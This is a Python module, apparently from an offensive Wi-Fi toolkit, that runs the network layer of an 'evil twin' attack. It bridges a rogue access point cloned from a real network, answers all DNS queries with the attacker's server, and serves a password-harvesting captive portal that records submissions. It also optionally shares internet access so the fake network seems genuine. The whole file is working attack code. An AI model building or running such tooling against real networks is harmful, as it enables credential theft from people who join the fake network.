"""PortalStack: the open-twin IP layer as one unit (Data-frame bridge + DHCP + wildcard DNS +
captive-portal HTTP + best-effort internet sharing). ``EvilTwinCampaign`` starts/stops exactly
this one object; a bridge/DHCP/DNS/HTTP failure tears the whole stack back down (the campaign
degrades to association-only, see ``EvilTwinCampaign.ip_layer_error``) but a NAT failure does
not: internet access is a bonus on top of a working portal, not a requirement for one, and a
missing/broken uplink is a routine condition (a laptop with no internet of its own to share),
not a bring-up bug (see ``nat_error`` / ``internet_shared``).
"""
from __future__ import annotations

import logging
from typing import Callable, List, Optional

from wifit3.campaigns.eviltwin.bridge import SERVER_IP, SUBNET, IpBridge
from wifit3.net.dns import DnsServer
from wifit3.net.http_portal import HttpPortalServer
from wifit3.net.nat import NatGateway
from wifit3.net.portal_templates import PortalTemplate, render

logger = logging.getLogger(__name__)


class PortalStack:
    def __init__(self, twin_iface, bssid: bytes, ssid: str, tap_name: str = "wifit3tap0",
                template: PortalTemplate = PortalTemplate.PASSWORD,
                on_submit: Optional[Callable[[dict], None]] = None):
        self.bridge = IpBridge(twin_iface, bssid, tap_name)
        self.dns = DnsServer(tap_name, answer_ip=SERVER_IP)
        self.http = HttpPortalServer(tap_name, page=render(template, ssid), on_submit=on_submit)
        self.nat = NatGateway(tap_name, SUBNET)
        self.nat_error: Optional[str] = None
        self._http_started = False

    @property
    def submissions(self) -> List[dict]:
        return self.http.submissions

    @property
    def internet_shared(self) -> bool:
        return self.nat.uplink is not None

    async def start(self) -> None:
        self.bridge.start()          # raises on failure; DNS/HTTP only attempted once it's up
        try:
            self.dns.start()
            await self.http.start()
            self._http_started = True
        except Exception:
            await self.stop()        # rolls back the bridge too, not just dns/http
            raise
        try:
            self.nat.start()
        except Exception as exc:                                  # noqa: BLE001
            logger.warning("eviltwin: internet sharing did not come up: %s", exc)
            self.nat_error = str(exc)

    async def stop(self) -> None:
        self.nat.stop()
        if self._http_started:
            await self.http.stop()
            self._http_started = False
        self.dns.stop()
        self.bridge.stop()
